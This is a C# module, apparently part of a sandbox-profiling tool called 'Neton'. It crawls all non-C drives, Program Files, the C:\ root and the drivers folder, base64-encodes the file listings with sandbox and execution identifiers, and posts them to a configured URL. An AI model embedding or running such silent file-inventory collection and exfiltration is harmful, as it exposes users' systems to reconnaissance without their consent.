using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace Neton
{
    class FileCrawler
    {
        static IEnumerable<string> GetFiles(string path)
        {
            Queue<string> queue = new Queue<string>();
            queue.Enqueue(path);
            while (queue.Count > 0)
            {
                path = queue.Dequeue();
                try
                {
                    foreach (string subDir in Directory.GetDirectories(path))
                    {
                        queue.Enqueue(subDir);
                    }
                }
                catch (Exception ex)
                {
                    //Console.Error.WriteLine(ex);
                }
                string[] files = null;
                try
                {
                    files = Directory.GetFiles(path);
                }
                catch (Exception ex)
                {
                    //Console.Error.WriteLine(ex);
                }
                if (files != null)
                {
                    for (int i = 0; i < files.Length; i++)
                    {
                        yield return files[i];
                    }
                }
            }
        }
        public static string listFilesInDrives()
        {
            DriveInfo[] allDrives = DriveInfo.GetDrives();
            List<string> res = new List<string>();
            foreach (DriveInfo d in allDrives)
            {
                if (d.Name != @"C:\")
                {
                    IEnumerable<string> f_list = GetFiles(d.ToString());
                    res.AddRange(f_list.ToList());
                }
            }
            return string.Join("\n", res.ToArray());
        }
        static void SendInfo(Settings settings)
        {
            string lFilesInDrives = listFilesInDrives();
            string[] lProgramFiles64;
            string[] lProgramFiles86;
            string[] lDirC;
            string[] lDrivers;
            try
            {
                lProgramFiles64 = Directory.GetDirectories(@"c:\Program Files");
            }
            catch
            {
                lProgramFiles64 = new string[0];
            }
            try
            {
                lProgramFiles86 = Directory.GetDirectories(@"c:\Program Files (x86)");
            }
            catch
            {
                lProgramFiles86 = new string[0];
            }
            try
            {
                lDirC = Directory.GetDirectories(@"c:\");
            }
            catch
            {
                lDirC = new string[0];
            }
            try
            {
                lDrivers = Directory.GetFiles(Path.Combine(Environment.SystemDirectory, "drivers"));
            }
            catch
            {
                lDrivers = new string[0];
            }

            object data = new
            {
                sFilesInDrives = Helpers.B64e(lFilesInDrives),
                sProgramFiles64 = Helpers.B64e(string.Join("\n", lProgramFiles64)),
                sProgramFiles86 = Helpers.B64e(string.Join("\n", lProgramFiles86)),
                sDirC = Helpers.B64e(string.Join("\n", lDirC)),
                sDrivers = Helpers.B64e(string.Join("\n", lDrivers)),
                sandboxId = Helpers.B64e(settings.sandboxId),
                executionId = Helpers.B64e(settings.executionId),
                wave = Helpers.B64e(settings.wave),
                module = Helpers.B64e("filecrawler"),
                version = Helpers.B64e(settings.version),
                md5Hash = Helpers.B64e(settings.md5Hash),
                sha256Hash = Helpers.B64e(settings.sha256Hash),
            };
            Helpers.SendData(settings.url, data);
        }

        public static void Launch(Settings settings)
        {
            SendInfo(settings);
        }
    }
}
